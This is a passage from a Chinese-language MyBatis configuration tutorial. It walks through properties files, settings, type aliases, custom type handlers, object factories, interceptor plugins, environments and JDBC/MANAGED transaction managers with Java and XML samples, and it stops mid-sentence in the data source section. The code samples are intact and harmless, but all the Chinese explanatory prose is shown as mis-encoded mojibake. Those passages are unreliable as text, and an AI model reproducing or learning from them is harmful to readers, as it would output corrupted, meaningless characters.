123dataSource.user=rootdataSource.password=123456dataSource.jdbcUrl=jdbc:mysql://127.0.0.1:3306/mybatis_lesson?characterEncoding=utf8&amp;autoReconnect=true&amp;useSSL=false&amp;useUnicode=true&amp;useJDBCCompliantTimezoneShift=true&amp;useLegacyDatetimeCode=false&amp;serverTimezone=UTC mybatis-config.xml 123456789101112131415161718192021&lt;configuration&gt; &lt;!-- è¯»å–å¤–éƒ¨çš„æ–‡ä»¶ --&gt; &lt;properties resource="config.properties" &gt; &lt;!-- è¿˜å¯ä»¥åœ¨ properties æ ‡ç­¾çš„å­æ ‡ç­¾ä¸­è®¾ç½®--&gt; &lt;property name="dataSource.driverClass" value="com.mysql.cj.jdbc.Driver"/&gt; &lt;/properties&gt; &lt;environments default="development"&gt; &lt;environment id="development"&gt; &lt;!-- é…ç½®äº‹åŠ¡ --&gt; &lt;transactionManager type="JDBC" /&gt; &lt;!-- é…ç½®æ•°æ®æº --&gt; &lt;dataSource type="POOLED"&gt; &lt;property name="url" value="${dataSource.jdbcUrl}" /&gt; &lt;property name="username" value="${dataSource.user}" /&gt; &lt;property name="password" value="${dataSource.password}" /&gt; &lt;property name="driver" value="${dataSource.driverClass}" /&gt; &lt;/dataSource&gt; &lt;/environment&gt; &lt;/environments&gt;&lt;/configuration&gt; æç¤º ä¸Šè¿°ä¾‹å­ä¸­çš„ driver å°†ä¼šç”± properties æ ‡ç­¾çš„å­æ ‡ç­¾ä¸­è®¾ç½®çš„ç›¸åº”å€¼æ¥æ›¿æ¢ã€‚ï¼Œè€Œ urlã€username å’Œ password å±æ€§å°†ä¼šç”± config.properties é…ç½®æ–‡ä»¶ä¸­å¯¹åº”çš„å€¼æ¥æ›¿æ¢ï¼Œè¿™æ ·å°±ä¸ºé…ç½®æä¾›äº†è¯¸å¤šçµæ´»é€‰æ‹©ã€‚ å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå¼€å‘äººå‘˜è¿˜å¯ä»¥åœ¨ SqlSessionFactoryBuilder.build() æ–¹æ³•ä¸­ä¼ å…¥å±æ€§å€¼ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 123SqlSessionFactory factory = new SqlSessionFactoryBuilder().build(reader, props);// ... æˆ–è€… ...SqlSessionFactory factory = new SqlSessionFactoryBuilder().build(reader, environment, props); å¦‚æœä¸€ä¸ªå±æ€§åœ¨ä¸åªä¸€ä¸ªåœ°æ–¹è¿›è¡Œäº†é…ç½®ï¼Œé‚£ä¹ˆ MyBatis å°†æŒ‰ç…§ä¸‹é¢çš„é¡ºåºæ¥åŠ è½½ï¼š é¦–å…ˆè¯»å–åœ¨ properties æ ‡ç­¾ä¸­æŒ‡å®šçš„å±æ€§ã€‚ ç„¶åæ ¹æ® properties æ ‡ç­¾ä¸­çš„ resource å±æ€§è¯»å–ç±»è·¯å¾„ä¸‹é…ç½®æ–‡ä»¶ï¼Œæˆ–è€…æ ¹æ® url å±æ€§æŒ‡å®šçš„è·¯å¾„è¯»å–é…ç½®æ–‡ä»¶ï¼Œå¹¶è¦†ç›–ä¹‹å‰è¯»å–è¿‡çš„åŒåå±æ€§ã€‚ æœ€åè¯»å–ä½œä¸ºæ–¹æ³•å‚æ•°ä¼ é€’çš„å±æ€§ï¼Œå¹¶è¦†ç›–ä¹‹å‰è¯»å–è¿‡çš„åŒåå±æ€§ã€‚ å› æ­¤ï¼Œé€šè¿‡æ–¹æ³•å‚æ•°ä¼ é€’çš„å±æ€§å…·æœ‰æœ€é«˜ä¼˜å…ˆçº§ï¼Œresource/url å±æ€§ä¸­æŒ‡å®šçš„é…ç½®æ–‡ä»¶æ¬¡ä¹‹ï¼Œæœ€ä½ä¼˜å…ˆçº§çš„åˆ™æ˜¯ properties æ ‡ç­¾ä¸­æŒ‡å®šçš„å±æ€§ã€‚ è®¾ç½®ï¼ˆsettingsï¼‰è¿™æ˜¯ MyBatis ä¸­æä¸ºé‡è¦çš„è°ƒæ•´è®¾ç½®ï¼Œå®ƒä»¬ä¼šæ”¹å˜ MyBatis çš„è¿è¡Œæ—¶è¡Œä¸ºï¼Œå®Œæ•´çš„é…ç½®å±æ€§è¯·çœ‹è¿™é‡Œã€‚é…ç½®ç¤ºä¾‹å¦‚ä¸‹ï¼š 12345678910111213141516171819&lt;configuration&gt; &lt;settings&gt; &lt;setting name="cacheEnabled" value="true"/&gt; &lt;setting name="lazyLoadingEnabled" value="true"/&gt; &lt;setting name="multipleResultSetsEnabled" value="true"/&gt; &lt;setting name="useColumnLabel" value="true"/&gt; &lt;setting name="useGeneratedKeys" value="false"/&gt; &lt;setting name="autoMappingBehavior" value="PARTIAL"/&gt; &lt;setting name="autoMappingUnknownColumnBehavior" value="WARNING"/&gt; &lt;setting name="defaultExecutorType" value="SIMPLE"/&gt; &lt;setting name="defaultStatementTimeout" value="25"/&gt; &lt;setting name="defaultFetchSize" value="100"/&gt; &lt;setting name="safeRowBoundsEnabled" value="false"/&gt; &lt;setting name="mapUnderscoreToCamelCase" value="false"/&gt; &lt;setting name="localCacheScope" value="SESSION"/&gt; &lt;setting name="jdbcTypeForNull" value="OTHER"/&gt; &lt;setting name="lazyLoadTriggerMethods" value="equals,clone,hashCode,toString"/&gt; &lt;/settings&gt;&lt;/configuration&gt; ç±»å‹åˆ«åï¼ˆtypeAliasesï¼‰ç±»å‹åˆ«åå¯ä»¥ä¸º Java ç±»å‹è®¾ç½®ä¸€ä¸ªç¼©å†™åå­—ã€‚å®ƒä»…ç”¨äº XML é…ç½®ä¸­ï¼Œæ„åœ¨é™ä½å†—ä½™çš„å…¨é™å®šç±»åä¹¦å†™ï¼Œæ–¹ä¾¿å¼•ç”¨æŸä¸ªç±»ã€‚ä¾‹å¦‚ï¼š 12345&lt;configuration&gt; &lt;typeAliases&gt; &lt;typeAlias alias="Employee" type="com.clay.mybatis.bean.Employee" /&gt; &lt;/typeAliases&gt;&lt;/configuration&gt; å½“åœ¨ XML é‡Œè¿™æ ·é…ç½®æ—¶ï¼ŒEmployee å¯ä»¥ç”¨åœ¨ä»»ä½•ä½¿ç”¨ com.clay.mybatis.bean.Employee çš„åœ°æ–¹ã€‚ä¾‹å¦‚ SQL æ˜ å°„æ–‡ä»¶é‡Œçš„ resultType å¯ä»¥åœ¨ç›´æ¥ä½¿ç”¨ç±»å‹åˆ«åï¼Œè¿™æ ·å¯ä»¥çœå»å…¨é™å®šç±»åçš„ä¹¦å†™ï¼Œå³ resultType="com.clay.mybatis.bean.Employee"ã€‚ 12345&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getById" resultType="Employee"&gt; select id, last_name, gender, email from t_employee where id = #{id} &lt;/select&gt;&lt;/mapper&gt; å€¼å¾—ä¸€æçš„æ˜¯ï¼Œåœ¨ç±»å¾ˆå¤šçš„æƒ…å†µä¸‹ï¼Œè¿˜å¯ä»¥æŒ‡å®šä¸€ä¸ªåŒ…åï¼ŒMyBatis ä¼šåœ¨åŒ…åï¼ˆåŒ…æ‹¬å­åŒ…ï¼‰ä¸‹é¢æœç´¢éœ€è¦çš„ Java Beanã€‚ä¾‹å¦‚ï¼š 12345&lt;configuration&gt; &lt;typeAliases&gt; &lt;package name="com.clay.mybatis.bean"/&gt; &lt;/typeAliases&gt;&lt;/configuration&gt; æ¯ä¸€ä¸ªåœ¨åŒ… com.clay.mybatis.bean ä¸­çš„ Java Beanï¼Œåœ¨æ²¡æœ‰ä½¿ç”¨ @Alias æ³¨è§£çš„æƒ…å†µä¸‹ï¼Œé»˜è®¤ä¼šä½¿ç”¨ Bean çš„é¦–å­—æ¯å°å†™çš„éé™å®šç±»åæ¥ä½œä¸ºå®ƒçš„åˆ«åã€‚ æ¯”å¦‚ com.clay.mybatis.bean.Employee çš„é»˜è®¤åˆ«åä¸º employeeï¼›è‹¥æœ‰æ³¨è§£ï¼Œåˆ™åˆ«åä¸ºå…¶æ³¨è§£å€¼ã€‚ 1234@Alias("employee")public class Employee { ...} æç¤º åœ¨ MyBatis ä¸­ï¼Œç±»å‹åˆ«åä¸åŒºåˆ†å¤§å°å†™ å½“ Java åŒ…å’Œå­åŒ…é‡Œæœ‰ç›¸åŒåç§°çš„ç±»æ—¶ï¼Œä½¿ç”¨åŒ…åä½œä¸ºç±»å‹åˆ«ååˆ™ä¼šå‡ºé”™ï¼Œè¿™æ—¶å€™åº”è¯¥ä½¿ç”¨ @Alias æ³¨è§£æ¥è§£å†³ç±»å‹åˆ«åå†²çªçš„é—®é¢˜ MyBatis å·²ç»ä¸ºè®¸å¤šå¸¸è§çš„ Java ç±»å‹å†…å»ºäº†ç›¸åº”çš„ç±»å‹åˆ«åï¼Œå®ƒä»¬éƒ½æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œå¹¶ä¸ºäº†åº”å¯¹åŸå§‹ç±»å‹çš„å‘½åé‡å¤ï¼Œé‡‡å–äº†ç‰¹æ®Šçš„å‘½åé£æ ¼ï¼ŒæŸ¥çœ‹å†…å»ºçš„ç±»å‹åˆ«ååˆ—è¡¨ ç±»å‹å¤„ç†å™¨ï¼ˆtypeHandlersï¼‰MyBatis åœ¨è®¾ç½®é¢„å¤„ç†è¯­å¥ï¼ˆPreparedStatementï¼‰ä¸­çš„å‚æ•°æˆ–ä»ç»“æœé›†ä¸­å–å‡ºä¸€ä¸ªå€¼æ—¶ï¼Œéƒ½ä¼šç”¨ç±»å‹å¤„ç†å™¨å°†è·å–åˆ°çš„å€¼ä»¥åˆé€‚çš„æ–¹å¼è½¬æ¢æˆ Java ç±»å‹ã€‚ é»˜è®¤çš„ç±»å‹å¤„ç†å™¨MyBatis å†…ç½®äº†ä¸€äº›é»˜è®¤çš„ç±»å‹å¤„ç†å™¨ï¼Œå®Œæ•´çš„ç±»å‹å¤„ç†å™¨åˆ—è¡¨å¦‚ä¸‹ï¼š è‡ªå®šä¹‰ç±»å‹å¤„ç†å™¨åœ¨é¡¹ç›®å¼€å‘ä¸­ï¼Œå¯ä»¥å®ç° org.apache.ibatis.type.TypeHandler æ¥å£æˆ–è€…ç»§æ‰¿ org.apache.ibatis.type.BaseTypeHandler ç±»ï¼Œä»¥æ­¤æ¥é‡å†™å·²æœ‰çš„ç±»å‹å¤„ç†å™¨æˆ–åˆ›å»ºè‡ªå·±çš„ç±»å‹å¤„ç†å™¨æ¥å¤„ç†ä¸æ”¯æŒçš„æˆ–éæ ‡å‡†çš„ç±»å‹ã€‚ è‡ªå®šä¹‰ç±»å‹å¤„ç†å™¨ 123456789101112131415161718192021222324@MappedJdbcTypes(JdbcType.VARCHAR)public class ExampleTypeHandler extends BaseTypeHandler&lt;String&gt; { @Override public void setNonNullParameter(PreparedStatement ps, int i, String parameter, JdbcType jdbcType) throws SQLException { ps.setString(i, parameter); } @Override public String getNullableResult(ResultSet rs, String columnName) throws SQLException { return rs.getString(columnName); } @Override public String getNullableResult(ResultSet rs, int columnIndex) throws SQLException { return rs.getString(columnIndex); } @Override public String getNullableResult(CallableStatement cs, int columnIndex) throws SQLException { return cs.getString(columnIndex); } } æ³¨å†Œç±»å‹å¤„ç†å™¨ 12345&lt;configuration&gt; &lt;typeHandlers&gt; &lt;typeHandler handler="com.clay.mybatis.handler.ExampleTypeHandler"/&gt; &lt;/typeHandlers&gt;&lt;/configuration&gt; ä½¿ç”¨ä¸Šè¿°è‡ªå®šä¹‰çš„ç±»å‹å¤„ç†å™¨å°†ä¼šè¦†ç›–å·²æœ‰çš„å¤„ç† Java String ç±»å‹çš„å±æ€§ä»¥åŠ VARCHAR ç±»å‹çš„å‚æ•°å’Œç»“æœçš„ç±»å‹å¤„ç†å™¨ã€‚ç‰¹åˆ«æ³¨æ„ï¼ŒMyBatis ä¸ä¼šé€šè¿‡æ£€æµ‹æ•°æ®åº“å…ƒä¿¡æ¯æ¥å†³å®šä½¿ç”¨å“ªç§ JDBC ç±»å‹ï¼Œæ‰€ä»¥å¿…é¡»åœ¨å‚æ•°å’Œç»“æœæ˜ å°„ä¸­æŒ‡æ˜å­—æ®µæ˜¯ VARCHAR ç±»å‹ï¼Œä»¥ä½¿å…¶èƒ½å¤Ÿç»‘å®šåˆ°æ­£ç¡®çš„ç±»å‹å¤„ç†å™¨ä¸Šï¼Œè¿™æ˜¯å› ä¸º MyBatis ç›´åˆ° SQL è¯­å¥è¢«æ‰§è¡Œæ—¶æ‰æ¸…æ¥šæ•°æ®ç±»å‹ã€‚ æ—¥æœŸæ—¶é—´ç±»å‹å¤„ç†å™¨æ—¥æœŸå’Œæ—¶é—´çš„å¤„ç†ï¼Œåœ¨ JDK1.8 ä»¥å‰ä¸€ç›´æ˜¯ä¸ªå¤´ç–¼çš„é—®é¢˜ã€‚æˆ‘ä»¬é€šå¸¸ä½¿ç”¨ JSR-310ï¼ˆæ—¥æœŸå’Œæ—¶é—´ APIï¼‰ è§„èŒƒé¢†å¯¼è€… Stephen Colebourne åˆ›å»ºçš„ Joda-Time æ¥æ“ä½œã€‚JDK 1.8 å·²ç»å®ç°äº†å…¨éƒ¨çš„ JSR-310 è§„èŒƒï¼Œè€Œä¸” MyBatis ä» 3.4.5 å¼€å§‹ï¼Œé»˜è®¤æ”¯æŒ JSR-310 è§„èŒƒã€‚å› æ­¤åœ¨æ—¥æœŸæ—¶é—´å¤„ç†ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ MyBatis åŸºäº JSR-310 ç¼–å†™çš„å„ç§æ—¥æœŸæ—¶é—´ç±»å‹å¤„ç†å™¨ã€‚MyBatis 3.4.5 ä»¥å‰çš„ç‰ˆæœ¬éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨æ³¨å†Œè¿™äº›å¤„ç†å™¨ï¼Œä»¥åçš„ç‰ˆæœ¬åˆ™éƒ½æ˜¯è‡ªåŠ¨æ³¨å†Œçš„ã€‚æ‰‹åŠ¨æ³¨å†Œçš„æ­¥éª¤å¦‚ä¸‹ï¼š å¼•å…¥ç±»å‹è½¬æ¢çš„ä¾èµ– 12345&lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis-typehandlers-jsr310&lt;/artifactId&gt; &lt;version&gt;1.0.2&lt;/version&gt;&lt;/dependency&gt; æ³¨å†Œæ—¥æœŸæ—¶é—´ç±»å‹å¤„ç†å™¨ 1234567891011&lt;configuration&gt; &lt;typeHandlers&gt; &nbsp;&nbsp; &nbsp;&lt;typeHandler handler="org.apache.ibatis.type.InstantTypeHandler" /&gt; &nbsp;&nbsp; &nbsp;&lt;typeHandler handler="org.apache.ibatis.type.LocalDateTimeTypeHandler" /&gt; &nbsp;&nbsp; &nbsp;&lt;typeHandler handler="org.apache.ibatis.type.LocalDateTypeHandler" /&gt; &nbsp;&nbsp; &nbsp;&lt;typeHandler handler="org.apache.ibatis.type.LocalTimeTypeHandler" /&gt; &nbsp;&nbsp; &nbsp;&lt;typeHandler handler="org.apache.ibatis.type.OffsetDateTimeTypeHandler" /&gt; &nbsp;&nbsp; &nbsp;&lt;typeHandler handler="org.apache.ibatis.type.OffsetTimeTypeHandler" /&gt; &nbsp;&nbsp; &nbsp;&lt;typeHandler handler="org.apache.ibatis.type.ZonedDateTimeTypeHandler" /&gt; &lt;/typeHandlers&gt;&lt;/configuration&gt; æç¤º åœ¨ POJO ç±»é‡Œé¢ï¼Œå¯ä»¥ä½¿ç”¨ java.sql.Dateã€java.sql.Timestampã€java.util.Date åˆ†åˆ«æ˜ å°„æ•°æ®åº“çš„ dateã€timestampã€datetime ç±»å‹ï¼Œä½†æ˜¯è¿™äº›ç±»è®¸å¤šæ–¹æ³•éƒ½å·²ç»è¿‡æ—¶ã€‚Java 1.8 API ä¸­çš„ LocalDateã€LocalDateTimeã€LocalTime ç°åœ¨åˆ™æ¯”è¾ƒå¸¸ç”¨ã€‚ å¯¹è±¡å·¥å‚ï¼ˆobjectFactoryï¼‰æ¯æ¬¡ MyBatis åˆ›å»ºç»“æœå¯¹è±¡çš„æ–°å®ä¾‹æ—¶ï¼Œå®ƒéƒ½ä¼šä½¿ç”¨ä¸€ä¸ªå¯¹è±¡å·¥å‚ï¼ˆObjectFactoryï¼‰å®ä¾‹æ¥å®Œæˆå®ä¾‹åŒ–å·¥ä½œã€‚ é»˜è®¤çš„å¯¹è±¡å·¥å‚éœ€è¦åšçš„ä»…ä»…æ˜¯å®ä¾‹åŒ–ç›®æ ‡ç±»ï¼Œè¦ä¹ˆé€šè¿‡é»˜è®¤æ— å‚æ„é€ æ–¹æ³•ï¼Œè¦ä¹ˆé€šè¿‡å­˜åœ¨çš„å‚æ•°æ˜ å°„æ¥è°ƒç”¨å¸¦æœ‰å‚æ•°çš„æ„é€ æ–¹æ³•ã€‚å¦‚æœæƒ³è¦†ç›–å¯¹è±¡å·¥å‚çš„é»˜è®¤è¡Œä¸ºï¼Œå¯ä»¥é€šè¿‡åˆ›å»ºè‡ªå·±çš„å¯¹è±¡å·¥å‚æ¥å®ç°ã€‚ è‡ªå®šä¹‰å¯¹è±¡å·¥å‚ 1234567891011121314151617181920212223public class ExampleObjectFactory extends DefaultObjectFactory { @Override public &lt;T&gt; T create(Class&lt;T&gt; type) { return super.create(type); } @Override public &lt;T&gt; T create(Class&lt;T&gt; type, List&lt;Class&lt;?&gt;&gt; constructorArgTypes, List&lt;Object&gt; constructorArgs) { return super.create(type, constructorArgTypes, constructorArgs); } @Override public void setProperties(Properties properties) { super.setProperties(properties); } @Override public &lt;T&gt; boolean isCollection(Class&lt;T&gt; type) { return Collection.class.isAssignableFrom(type); }} æ³¨å†Œå¯¹è±¡å·¥å‚ 12345&lt;configuration&gt; &lt;objectFactory type="com.clay.mybatis.factory.ExampleObjectFactory"&gt; &lt;property name="someProperty" value="100"/&gt; &lt;/objectFactory&gt;&lt;/configuration&gt; ObjectFactory æ¥å£å¾ˆç®€å•ï¼Œå®ƒåŒ…å«ä¸¤ä¸ªåˆ›å»ºå®ä¾‹ç”¨çš„æ–¹æ³•ï¼Œä¸€ä¸ªæ˜¯å¤„ç†é»˜è®¤æ— å‚æ„é€ æ–¹æ³•çš„ï¼Œå¦å¤–ä¸€ä¸ªæ˜¯å¤„ç†å¸¦å‚æ•°çš„æ„é€ æ–¹æ³•çš„ã€‚ å¦å¤–ï¼ŒsetProperties æ–¹æ³•å¯ä»¥è¢«ç”¨æ¥é…ç½® ObjectFactoryï¼Œåœ¨åˆå§‹åŒ–è‡ªå®šä¹‰çš„ ObjectFactory å®ä¾‹åï¼ŒobjectFactory æ ‡ç­¾å†…å®šä¹‰çš„å±æ€§ä¼šè¢«ä¼ é€’ç»™ setProperties æ–¹æ³•ã€‚ æ’ä»¶ï¼ˆpluginsï¼‰MyBatis å…è®¸ä½ åœ¨æ˜ å°„è¯­å¥æ‰§è¡Œè¿‡ç¨‹ä¸­çš„æŸä¸€ç‚¹è¿›è¡Œæ‹¦æˆªè°ƒç”¨ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒMyBatis å…è®¸ä½¿ç”¨æ’ä»¶æ¥æ‹¦æˆªçš„æ–¹æ³•è°ƒç”¨åŒ…æ‹¬ï¼š Executor (update, query, flushStatements, commit, rollback, getTransaction, close, isClosed) ParameterHandler (getParameterObject, setParameters) ResultSetHandler (handleResultSets, handleOutputParameters) StatementHandler (prepare, parameterize, batch, update, query) è¿™äº›ç±»ä¸­æ–¹æ³•çš„ç»†èŠ‚å¯ä»¥ç›´æ¥æŸ¥çœ‹ MyBatis å‘è¡ŒåŒ…ä¸­çš„æºä»£ç ã€‚å¦‚æœä½ æƒ³åšçš„ä¸ä»…ä»…æ˜¯ç›‘æ§æ–¹æ³•çš„è°ƒç”¨ï¼Œé‚£ä¹ˆä½ æœ€å¥½ç›¸å½“äº†è§£è¦é‡å†™çš„æ–¹æ³•çš„è¡Œä¸ºã€‚å› ä¸ºåœ¨è¯•å›¾ä¿®æ”¹æˆ–é‡å†™å·²æœ‰æ–¹æ³•çš„è¡Œä¸ºæ—¶ï¼Œå¾ˆå¯èƒ½ä¼šç ´å MyBatis çš„æ ¸å¿ƒæ¨¡å—ã€‚è¿™äº›éƒ½æ˜¯æ›´åº•å±‚çš„ç±»å’Œæ–¹æ³•ï¼Œæ‰€ä»¥ä½¿ç”¨æ’ä»¶çš„æ—¶å€™éœ€è¦ç‰¹åˆ«å°å¿ƒã€‚æ’ä»¶é€šè¿‡åŠ¨æ€ä»£ç†æœºåˆ¶ï¼Œå¯ä»¥ä»‹å…¥å››å¤§å¯¹è±¡çš„ä»»ä½•ä¸€ä¸ªæ–¹æ³•çš„æ‰§è¡Œã€‚é€šè¿‡ MyBatis æä¾›çš„å¼ºå¤§æœºåˆ¶ï¼Œè‡ªå®šä¹‰æ’ä»¶æ˜¯éå¸¸ç®€å•çš„ï¼Œåªéœ€å®ç° Interceptor æ¥å£ï¼Œå¹¶æŒ‡å®šæƒ³è¦æ‹¦æˆªçš„æ–¹æ³•å³å¯ã€‚ è‡ªå®šä¹‰æ’ä»¶ 12345678910111213141516171819202122@Intercepts({@Signature( type= Executor.class, method = "update", args = {MappedStatement.class, Object.class})})public class ExamplePlugin implements Interceptor { private Properties properties = new Properties(); @Override public Object intercept(Invocation invocation) throws Throwable { // implement pre processing if need Object returnObject = invocation.proceed(); // implement post processing if need return returnObject; } @Override public void setProperties(Properties properties) { this.properties = properties; }} æ³¨å†Œæ’ä»¶ 1234567&lt;configuration&gt; &lt;plugins&gt; &lt;plugin interceptor="com.clay.mybatis.plugin.ExamplePlugin"&gt; &lt;property name="someProperty" value="100"/&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/configuration&gt; ä¸Šé¢è‡ªå®šä¹‰çš„æ’ä»¶å°†ä¼šæ‹¦æˆªåœ¨ Executor å®ä¾‹ä¸­æ‰€æœ‰çš„ update æ–¹æ³•è°ƒç”¨ï¼Œè¿™é‡Œçš„ Executor æ˜¯è´Ÿè´£æ‰§è¡Œåº•å±‚æ˜ å°„è¯­å¥çš„å†…éƒ¨å¯¹è±¡ã€‚ ç¯å¢ƒé…ç½®ï¼ˆenvironmentsï¼‰MyBatis å¯ä»¥é…ç½®æˆé€‚åº”å¤šç§ç¯å¢ƒï¼Œè¿™ç§æœºåˆ¶æœ‰åŠ©äºå°† SQL æ˜ å°„åº”ç”¨äºå¤šç§æ•°æ®åº“ä¹‹ä¸­ï¼Œç°å®æƒ…å†µä¸‹æœ‰å¤šç§ç†ç”±éœ€è¦è¿™ä¹ˆåšã€‚ä¾‹å¦‚ï¼Œå¼€å‘ã€æµ‹è¯•å’Œç”Ÿäº§ç¯å¢ƒéœ€è¦æœ‰ä¸åŒçš„é…ç½®ï¼›æˆ–è€…æƒ³åœ¨å…·æœ‰ç›¸åŒ Schema çš„å¤šä¸ªç”Ÿäº§æ•°æ®åº“ä¸­ä½¿ç”¨ç›¸åŒçš„ SQL æ˜ å°„ï¼Œè¿˜æœ‰è®¸å¤šç±»ä¼¼çš„ä½¿ç”¨åœºæ™¯ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå°½ç®¡ MyBatis å¯ä»¥é…ç½®å¤šä¸ªç¯å¢ƒï¼Œä½†æ¯ä¸ª SqlSessionFactory å®ä¾‹åªèƒ½é€‰æ‹©ä¸€ç§ç¯å¢ƒã€‚æ‰€ä»¥ï¼Œå¦‚æœæƒ³è¿æ¥ä¸¤ä¸ªæ•°æ®åº“ï¼Œå°±éœ€è¦åˆ›å»ºä¸¤ä¸ª SqlSessionFactory å®ä¾‹ï¼Œæ¯ä¸ªæ•°æ®åº“å¯¹åº”ä¸€ä¸ªï¼›è€Œå¦‚æœæ˜¯ä¸‰ä¸ªæ•°æ®åº“ï¼Œå°±éœ€è¦ä¸‰ä¸ªå®ä¾‹ï¼Œä¾æ­¤ç±»æ¨ã€‚ 123456789101112131415&lt;configuration&gt; &lt;environments default="development"&gt; &lt;environment id="development"&gt; &lt;transactionManager type="JDBC"&gt; &lt;property name="..." value="..."/&gt; &lt;/transactionManager&gt; &lt;dataSource type="POOLED"&gt; &lt;property name="driver" value="${driver}"/&gt; &lt;property name="url" value="${url}"/&gt; &lt;property name="username" value="${username}"/&gt; &lt;property name="password" value="${password}"/&gt; &lt;/dataSource&gt; &lt;/environment&gt; &lt;/environments&gt;&lt;/configuration&gt; æ³¨æ„ä¸€äº›å…³é”®ç‚¹: é»˜è®¤ä½¿ç”¨çš„ç¯å¢ƒ IDï¼ˆæ¯”å¦‚ï¼šdefault="development"ï¼‰ æ¯ä¸ª environment æ ‡ç­¾å®šä¹‰çš„ç¯å¢ƒ IDï¼ˆæ¯”å¦‚ï¼šid="development"ï¼‰ äº‹åŠ¡ç®¡ç†å™¨çš„é…ç½®ï¼ˆæ¯”å¦‚ï¼štype="JDBC"ï¼‰ æ•°æ®æºçš„é…ç½®ï¼ˆæ¯”å¦‚ï¼štype="POOLED"ï¼‰ é»˜è®¤ç¯å¢ƒå’Œç¯å¢ƒ ID é¡¾åæ€ä¹‰ã€‚ç¯å¢ƒ ID å¯ä»¥éšæ„å‘½åï¼Œä½†åŠ¡å¿…ä¿è¯é»˜è®¤çš„ç¯å¢ƒ ID è¦åŒ¹é…å…¶ä¸­ä¸€ä¸ªç¯å¢ƒ ID ä¸ºäº†æŒ‡å®šåˆ›å»ºå“ªç§ç¯å¢ƒï¼Œåªè¦å°†å®ƒä½œä¸ºå¯é€‰çš„å‚æ•°ä¼ é€’ç»™ SqlSessionFactoryBuilder å³å¯ï¼Œå¯ä»¥æ¥å—ç¯å¢ƒé…ç½®çš„ä¸¤ä¸ªæ–¹æ³•æ˜¯ï¼š 12SqlSessionFactory factory = new SqlSessionFactoryBuilder().build(reader, environment);SqlSessionFactory factory = new SqlSessionFactoryBuilder().build(reader, environment, properties); å¦‚æœå¿½ç•¥äº†ç¯å¢ƒå‚æ•°ï¼Œé‚£ä¹ˆå°†ä¼šåŠ è½½é»˜è®¤ç¯å¢ƒï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 12SqlSessionFactory factory = new SqlSessionFactoryBuilder().build(reader);SqlSessionFactory factory = new SqlSessionFactoryBuilder().build(reader, properties); äº‹åŠ¡ç®¡ç†å™¨åœ¨ MyBatis ä¸­æœ‰ä¸¤ç§ç±»å‹çš„äº‹åŠ¡ç®¡ç†å™¨ï¼ˆtransactionManagerï¼‰ï¼Œä¹Ÿå°±æ˜¯ type="[JDBC | MANAGED]"ã€‚ JDBCJDBC äº‹åŠ¡ç®¡ç†å™¨ç›´æ¥ä½¿ç”¨äº† JDBC çš„æäº¤å’Œå›æ»šåŠŸèƒ½ï¼Œå®ƒä¾èµ–ä»æ•°æ®æºè·å¾—çš„è¿æ¥æ¥ç®¡ç†äº‹åŠ¡ä½œç”¨åŸŸã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸ºäº†ä¸æŸäº›é©±åŠ¨ç¨‹åºå…¼å®¹ï¼Œå®ƒåœ¨å…³é—­è¿æ¥æ—¶å¯ç”¨è‡ªåŠ¨æäº¤ã€‚ç„¶è€Œï¼Œå¯¹äºæŸäº›é©±åŠ¨ç¨‹åºæ¥è¯´ï¼Œå¯ç”¨è‡ªåŠ¨æäº¤ä¸ä»…æ˜¯ä¸å¿…è¦çš„ï¼Œè€Œä¸”æ˜¯ä¸€ä¸ªä»£ä»·é«˜æ˜‚çš„æ“ä½œã€‚å› æ­¤ï¼Œä» 3.5.10 ç‰ˆæœ¬å¼€å§‹ï¼Œå¯ä»¥é€šè¿‡å°† skipSetAutoCommitOnClose å±æ€§è®¾ç½®ä¸º true æ¥è·³è¿‡è¿™ä¸ªæ­¥éª¤ã€‚ä¾‹å¦‚ï¼š 123&lt;transactionManager type="JDBC"&gt; &lt;property name="skipSetAutoCommitOnClose" value="true"/&gt;&lt;/transactionManager&gt; MANAGEDMANAGED äº‹åŠ¡ç®¡ç†å™¨å‡ ä¹æ²¡åšä»€ä¹ˆã€‚å®ƒä¸ä¼šæäº¤æˆ–å›æ»šä¸€ä¸ªè¿æ¥ï¼Œè€Œæ˜¯è®©å®¹å™¨æ¥ç®¡ç†äº‹åŠ¡çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸï¼ˆæ¯”å¦‚ JEE åº”ç”¨æœåŠ¡å™¨çš„ä¸Šä¸‹æ–‡ï¼‰ã€‚ é»˜è®¤æƒ…å†µä¸‹å®ƒä¼šå…³é—­è¿æ¥ã€‚ç„¶è€Œä¸€äº›å®¹å™¨å¹¶ä¸å¸Œæœ›è¿æ¥è¢«å…³é—­ï¼Œå› æ­¤éœ€è¦å°† closeConnection å±æ€§è®¾ç½®ä¸º false æ¥é˜»æ­¢é»˜è®¤çš„å…³é—­è¡Œä¸ºã€‚ä¾‹å¦‚: 123&lt;transactionManager type="MANAGED"&gt; &lt;property name="closeConnection" value="false"/&gt;&lt;/transactionManager&gt; æç¤º å¦‚æœä½¿ç”¨ Spring + MyBatisï¼Œåˆ™æ²¡æœ‰å¿…è¦é…ç½®äº‹åŠ¡ç®¡ç†å™¨ï¼Œå› ä¸º Spring æ¨¡å—ä¼šä½¿ç”¨è‡ªå¸¦çš„ç®¡ç†å™¨æ¥è¦†ç›–å‰é¢çš„é…ç½®ã€‚ æ•°æ®æºdataSource æ ‡ç­¾ä½¿ç”¨æ ‡å‡†çš„ JDBC æ•°æ®æºæ¥å£æ¥é…ç½® JDBC è¿æ¥å¯¹è±¡çš„èµ„æºã€‚å¤§å¤šæ•° MyBatis åº”ç”¨ç¨‹åºä¼šé…ç½®æ•°æ®æºï¼Œè™½ç„¶æ•°æ®æºé…ç½®æ˜¯å¯é€‰çš„ï¼Œä½†å¦‚æœè¦å¯ç”¨å»¶è¿ŸåŠ 